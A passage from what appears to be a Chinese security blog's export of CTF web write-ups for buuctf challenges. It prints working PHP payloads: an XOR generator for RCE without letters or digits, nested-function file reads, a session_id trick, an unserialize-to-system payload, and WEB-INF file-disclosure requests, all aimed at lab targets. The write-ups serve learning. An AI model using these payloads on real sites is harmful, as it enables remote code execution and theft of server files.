class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="keyword">string</span>)<span class="variable">$a</span> != (<span class="keyword">string</span>)<span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;no&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里测试最好在低版本php下测试不然高版本已经被修复了 我这里version是5.3.29</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679926309291-918ee00d-2b44-43fc-8424-04f9c2d48c25.png" alt="img"></p><p>测试是可以通过脚本碰撞</p><p>再来看sha1()</p><p>这里没有找到关于sha1的碰撞脚本，但是找到了两个符合条件的值，之后再遇到拿来用就行。</p><p>a&#x3D;<code>%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</code></p><p>b&#x3D;<code>%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679926782885-7cec8231-cd06-4dc8-b096-96e3b49887a7.png" alt="img"></p><h2 id="php命名规则"><a href="#php命名规则" class="headerlink" title="php命名规则"></a>php命名规则</h2><p>一开始做的时候以为这道题出问题了，最后发现这里有坑。</p><p>先来看本地测试，如果我们直接给NS_CTF.go传值，传入后会是什么呢？</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679927046246-3e3675f4-af68-4d8e-9be3-1c63a5ebffff.png" alt="img"></p><p>可见当我们传入的点号被改为了下划线，这里是因为点号在php内是非法命名符，会被转化为下划线</p><p>官方文档中有提到：<a href="https://www.php.net/manual/zh/language.variables.external.php">https://www.php.net/manual/zh/language.variables.external.php</a></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679927257277-ddeecad1-21b1-4a85-be39-e28b4bd87882.png" alt="img"></p><p>那么该怎么绕过呢 这里参考：<a href="https://xz.aliyun.com/t/11512">https://xz.aliyun.com/t/11512</a></p><p>构造payload: <code>NS[CTF.go=1</code>就能绕过 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679927514308-229d457c-463c-44b8-ab89-bda1cb695b70.png" alt="img"></p><p>这里会把第一个<code>[</code>先转化为下划线然后第二个点就不会被转化了</p><p>这里我认为是php解析时把第一个<code>[</code>当作了数组的标志但不合法就给转化了 然后以为点是数组里的元素名从而没有转化为下划线</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679927469133-3fe86fe3-7032-474b-9f2b-458df0d365ef.png" alt="img"></p><p>这个bug只有当php版本小于8时才会有：参考：<a href="https://blog.csdn.net/mochu7777777/article/details/115050295">https://blog.csdn.net/mochu7777777/article/details/115050295</a></p><p>php8版本修复了这个bug，如图</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679979254109-272268cf-7aef-41f0-af9c-6a23471c0c42.png" alt="img"></p><h2 id="无数字字母rce"><a href="#无数字字母rce" class="headerlink" title="无数字字母rce"></a>无数字字母rce</h2><p>这里用到了异或绕过，直接脚本生成，真的很方便 放大佬的理解：<a href="https://xz.aliyun.com/t/11929#toc-4">https://xz.aliyun.com/t/11929#toc-4</a> </p><p>总结的非常好透彻，我就不在这里多言了qwq</p><p>放一下构造脚本把：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a=[]</span><br><span class="line">ans1=<span class="string">&quot;&quot;</span> </span><br><span class="line">ans2=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>): <span class="comment">#设置i的范围</span></span><br><span class="line">    c=<span class="built_in">chr</span>(i)</span><br><span class="line">    <span class="comment">#将i转换成ascii对应的字符，并赋值给c</span></span><br><span class="line">    tmp = re.<span class="keyword">match</span>(<span class="string">r&#x27;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x27;</span>,c,re.I)</span><br><span class="line">    <span class="comment">#设置过滤条件，让变量c在其中找对应，并利用修饰符过滤大小写，这样可以得到未被过滤的字符</span></span><br><span class="line">    <span class="keyword">if</span>(tmp):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">        <span class="comment">#当执行正确时，那说明这些是被过滤掉的，所以才会被匹配到，此时我们让他继续执行即可</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a.append(i)</span><br><span class="line">        <span class="comment">#在数组中增加i，这些就是未被系统过滤掉的字符</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># eval(&quot;echo($c);&quot;);</span></span><br><span class="line">mya=<span class="string">&quot;system&quot;</span>  <span class="comment">#函数名 这里修改！</span></span><br><span class="line">myb=<span class="string">&quot;dir&quot;</span>      <span class="comment">#参数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myfun</span>(<span class="params">k,my</span>): <span class="comment">#自定义函数</span></span><br><span class="line">    <span class="keyword">global</span> ans1 <span class="comment">#引用全局变量ans1，使得在局部对其进行更改时不会报错</span></span><br><span class="line">    <span class="keyword">global</span> ans2 <span class="comment">#引用全局变量ans2，使得在局部对其进行更改时不会报错</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,<span class="built_in">len</span>(a)): <span class="comment">#设置循环范围为（0，a）注：a为未被过滤的字符数量 </span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i,<span class="built_in">len</span>(a)): <span class="comment">#在上个循环的条件下设置j的范围</span></span><br><span class="line">            <span class="keyword">if</span>(a[i]^a[j]==<span class="built_in">ord</span>(my[k])):</span><br><span class="line">                ans1+=<span class="built_in">chr</span>(a[i]) <span class="comment">#ans1=ans1+chr(a[i])</span></span><br><span class="line">                ans2+=<span class="built_in">chr</span>(a[j]) <span class="comment">#ans2=ans2+chr(a[j])</span></span><br><span class="line">                <span class="keyword">return</span>;<span class="comment">#返回循环语句中，重新寻找第二个k，这里的话就是寻找y对应的两个字符</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(mya)): <span class="comment">#设置k的范围</span></span><br><span class="line">    myfun(x,mya)<span class="comment">#引用自定义的函数</span></span><br><span class="line">data1=<span class="string">&quot;(&#x27;&quot;</span>+urllib.request.quote(ans1)+<span class="string">&quot;&#x27;^&#x27;&quot;</span>+urllib.request.quote(ans2)+<span class="string">&quot;&#x27;)&quot;</span> <span class="comment">#data1等于传入的命令,&quot;+ans1+&quot;是固定格式，这样可以得到变量对应的值，再用&#x27;包裹，这样是变量的固定格式，另一个也是如此，两个在进行URL编码后进行按位与运算，然后得到对应值</span></span><br><span class="line"><span class="built_in">print</span>(data1)</span><br><span class="line">ans1=<span class="string">&quot;&quot;</span><span class="comment">#对ans1进行重新赋值</span></span><br><span class="line">ans2=<span class="string">&quot;&quot;</span><span class="comment">#对ans2进行重新赋值</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(myb)):<span class="comment">#设置k的范围为(0,len(myb))</span></span><br><span class="line">    myfun(k,myb)<span class="comment">#再次引用自定义函数</span></span><br><span class="line">data2=<span class="string">&quot;(\&quot;&quot;</span>+urllib.request.quote(ans1)+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+urllib.request.quote(ans2)+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line"><span class="built_in">print</span>(data2)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 各赛事WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE奇淫方式 </tag>
            
            <tag> PHP反序列化 </tag>
            
            <tag> linux通配符 </tag>
            
            <tag> getshell </tag>
            
            <tag> md5 sha1强相等 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf 38-[GXYCTF2019]禁止套娃</title>
      <link href="/post/2ed7a105.html"/>
      <url>/post/2ed7a105.html</url>
      
        <content type="html"><![CDATA[<p>buuctf 38-[GXYCTF2019]禁止套娃</p><span id="more"></span><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337192.png" alt="img"></p><p>开局一张图，buu网站扫网站有时候出不来，看了别人的wp是git源码泄露了 参考大佬的文章：<a href="https://www.freebuf.com/articles/web/346607.html">https://www.freebuf.com/articles/web/346607.html</a> </p><p>可以拿config文件测试一下</p><p>构造payload：<code>http://9ec6b0e9-a2e5-4d60-b33a-22ff1c436245.node4.buuoj.cn:81/.git.config</code> </p><p> • <strong>config：</strong>文件包含项目特有的配置选项，git config命令会改动它；  </p><p>发现有文件下载下来 说明是github源码泄露</p><p>下好脚本 构造payload：<code>python2 GitHack.py http://9ec6b0e9-a2e5-4d60-b33a-22ff1c436245.node4.buuoj.cn:81/.git</code> 注意末尾加上 <code>.git</code> <img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337237.png" alt="img"></p><p>查看index.php </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>主要是过滤了一些伪协议和一些<code>“et”“na”“info”“dec”“bin”“hex”“oct”“pi”“log”</code>字符</p><p>最重要的是中间一层 有我不知道的正则表达式的知识点 参考：<a href="https://blog.csdn.net/Manuffer/article/details/120738755">https://blog.csdn.net/Manuffer/article/details/120738755</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;]))</span><br></pre></td></tr></table></figure><p>这里<code>(?R)</code>代表当前表达式 ,就是这个<code>(/[a-z,_]+((?R)?)/)</code>，所以会一直递归，?表示递归当前表达式0次或1次（若是(?R)*则表示递归当前表达式0次或多次，例如它可以匹配<code>a(b(c(d())))</code> 注意这里加号不是把前后连接起来 +：加号在正则表达式有特殊含义，等同于匹配前面的子表达式一次或多次</p><p>当<code>;</code>等于后面匹配完以后剩余的<code>;</code>条件成立  可以根据这个思路构造命令执行</p><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>localeconv() 函数返回一包含本地数字及货币格式信息的数组。</p><p>(PHP 4, PHP 5, PHP 7, PHP 8)</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337225.png" alt="img"></p><p>返回一个数组 第一个元素为<code>.</code> 构造payload的时候可以用的 <code>.</code> 和 <code>./</code> 意思相同都是当前目录 <code>../</code>是上级目录 </p><p>current() — 返回数组中的当前值</p><p>说明:</p><p>current(array|object $array): mixed</p><p>每个数组中都有一个内部的指针指向它“当前的”单元，初始化时会指向该数组中的第一个值。</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337217.png" alt="img"></p><p>构造<code>?exp=print_r(scandir(current(localeconv())));</code></p><p>所以这个组合scandir(current(localeconv()))很常用，可以记一下。</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337258.png" alt="img"></p><p>发现flag文件，接下来就是怎么读了，因为现在指针指在第一个元素上 把数组反转过来让flag文件在正数第二 再通过next()指向第二个元素读取flag</p><p>array_reverse() — 返回单元顺序相反的数组</p><p>next() — 将数组中的内部指针向前移动一位</p><p>show_source — 别名 highlight_file() 用哪个都行</p><p>构造payload:<code>?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337248.png" alt="img"></p><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>通过修改phpsession即会话状态 然后payload读出来即可 参考还是上面的文章 <a href="https://blog.csdn.net/Manuffer/article/details/120738755">https://blog.csdn.net/Manuffer/article/details/120738755</a></p><p>session_id()可以用来获取&#x2F;设置当前会话 ID,可以用这个函数来获取cookie中的<code>phpsessionid</code>了，并且这个值我们是可控的。</p><p>但session_id必须要开启session才可以使用，所以我们要先使用session_start。</p><p>构造payload:<code>?exp=show_source(session_id(session_start()));</code></p><p>bp抓包修改<code>session_id=flag.php</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082337617.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 源码泄露 </tag>
            
            <tag> GitHack </tag>
            
            <tag> (?R) </tag>
            
            <tag> 嵌套构造 </tag>
            
            <tag> PHPSESSION </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf 37-[网鼎杯 2020 朱雀组]phpweb</title>
      <link href="/post/6d6051d0.html"/>
      <url>/post/6d6051d0.html</url>
      
        <content type="html"><![CDATA[<p>buuctf [网鼎杯 2020 朱雀组]phpweb</p><span id="more"></span><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082340646.png" alt="img"></p><p>发现可以直接获取我们的时间，并且每五分钟刷新更新一次，大致意思就是利用系统时区设置，最重要的是应该是这个网页通过php 里的data()函数来获取当前我们的时间，并且在网页源代码中也标出来了，应该算是提示。</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082340325.png" alt="img"></p><p>并且发现 通过post方式 给<code>$func</code>传值为 <code>data</code>    <code>$p</code> 传值为<code>Y-m-d h:i:s a</code> data()函数格式化时间用的</p><p>所以就可以 用system() 函数命令执行了 但是肯定不行 被河蟹了 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082340430.png" alt="img"></p><p>发现随便输入时 会爆出call_user_func()函数 这个函数简单来说就是用第一个输入值作为回调函数 第二个输入为第一个回调函数的参数 </p><p>直接使用file_get_contents() 本来想直接爆出flag文件的内容 但是命名被改为别的形式了 呢就爆一下index.php看一下黑名单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line">    function gettime($func, $p) &#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        if ($a == &quot;string&quot;) &#123;</span><br><span class="line">            return $result;</span><br><span class="line">        &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Test &#123;</span><br><span class="line">        var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">        var $func = &quot;date&quot;;</span><br><span class="line">        function __destruct() &#123;</span><br><span class="line">            if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[&quot;func&quot;];</span><br><span class="line">    $p = $_REQUEST[&quot;p&quot;];</span><br><span class="line"></span><br><span class="line">    if ($func != null) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            echo gettime($func, $p);</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            die(&quot;Hacker...&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure><p>看到类就想到反序列化漏洞 将类中的属性值改为我们可以恶意操作的值 然后给<code>$func</code>传反序列化函数，给<code>p</code>传我们的序列化结果。</p><p>思路就是直接反序列化将原本post值修改 不通过黑名单筛选</p><p>本地构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;ls /&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Test</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造payload：<code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:4:&quot;ls /&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082340578.png" alt="img"></p><p>发现并没有flag文件 所以只能通过find指令寻找了 这里省略 我这里find找不出来没有回响 环境有问题</p><p>最后构造payload：<code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082340505.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf 35-[BJDCTF2020]The mystery of ip</title>
      <link href="/post/a4341e77.html"/>
      <url>/post/a4341e77.html</url>
      
        <content type="html"><![CDATA[<p>buuctf [BJDCTF2020]The mystery of ip</p><span id="more"></span><p>这道题考到了模板注入简单记录一些吧  参考：<a href="https://houbb.github.io/2020/08/09/web-safe-12-ssti">https://houbb.github.io/2020/08/09/web-safe-12-ssti</a></p><p>服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题.  </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082342348.png" alt="img"></p><p>获取到了我们的ip，第一时间就想到了修改xff</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082342770.png" alt="img"></p><p>但是没啥用 思路大概是就是利用xff 进行恶意读取吧 看了wp 是php的smarty模板注入 参考：<a href="https://www.anquanke.com/post/id/272393">https://www.anquanke.com/post/id/272393</a></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082342128.png" alt="img"></p><p>代码直接运行了 于是直接进行命令执行就行</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082342033.png" alt="img"></p><p>直接读根目录flag文件就行了</p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 模板注入 </tag>
            
            <tag> xff </tag>
            
            <tag> smarty模板 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf 34-[RoarCTF 2019]Easy Java</title>
      <link href="/post/d05894c4.html"/>
      <url>/post/d05894c4.html</url>
      
        <content type="html"><![CDATA[<p>buuctf 34-[RoarCTF 2019]Easy Java</p><span id="more"></span><p>弱口令能爆出来：</p><p>账号:admin</p><p>密码: admin888</p><p>但是没啥用 还是所以只剩下登录页面的帮助了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082343030.png" alt="img"></p><p>这里考到了java 的 WEB-INF 知识点 参考：<a href="https://www.cnblogs.com/shamo89/p/9948707.html">https://www.cnblogs.com/shamo89/p/9948707.html</a></p><p>但是这里通过get方式传参是不行的 只能通过post</p><p>构造 payload： <code>filename=WEB-INF/web.xml</code></p><p>WEB-INF&#x2F;web.xml  ： Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则   可以找到flag的位置以及命名方式</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082343221.png" alt="img"></p><p>找到了flag的地址 以及他的命名文件</p><p>秉持java 万物都是类的原则 要读取flag 就要读这个flag类</p><p>WEB-INF&#x2F;classes&#x2F;</p><p> 包含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中（是该目录不能包含在.jar文件中）  </p><p>构造payload ：<code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code>不要忘了class后缀 一开始就忘了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082343109.png" alt="img"></p><p>解码 得到flag！</p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 弱口令 </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf 33-[网鼎杯 2018]Fakebook</title>
      <link href="/post/c6fe9d66.html"/>
      <url>/post/c6fe9d66.html</url>
      
